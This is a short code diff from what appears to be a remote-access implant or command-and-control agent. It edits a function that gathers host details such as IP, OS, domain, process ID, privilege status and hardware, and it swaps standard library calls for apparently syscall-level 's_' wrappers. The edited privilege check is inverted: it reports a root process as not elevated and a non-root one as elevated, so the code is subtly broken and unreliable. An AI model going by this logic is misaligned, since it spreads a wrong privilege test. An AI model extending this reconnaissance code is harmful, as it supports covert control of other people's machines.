@@ -31,7 +31,6 @@ bool get_internal_ip(char *mem){
 }
 
 POSCONFIG get_os_config(){
-
     POSCONFIG cfg = (POSCONFIG)shaco_calloc(sizeof(OSCONFIG),1);
     if(!cfg) return NULL;
 
@@ -45,7 +44,7 @@ POSCONFIG get_os_config(){
         MSG("Can't get internal ip config");
         StringCopy(cfg->internal_ip, "127.0.0.1");
     }
-    if(uname(&info) < 0) {
+    if(s_uname(&info) < 0) {
         StringCopy(cfg->arch, "(none)");
         StringCopy(cfg->version, "(none)");
     }else {
@@ -54,8 +53,8 @@ POSCONFIG get_os_config(){
     }
 
     getdomainname(cfg->domain,254);
-    cfg->pid = getpid();
-    cfg->elevated = (getuid() == 0 ? (geteuid() == 0 ? true : false) : true);
+    cfg->pid = s_getpid();
+    cfg->elevated = (s_getuid() == 0 ? false : true);
     cfg->ram_size = mem_info.totalram;
     cfg->processors = get_nprocs();
     return cfg;
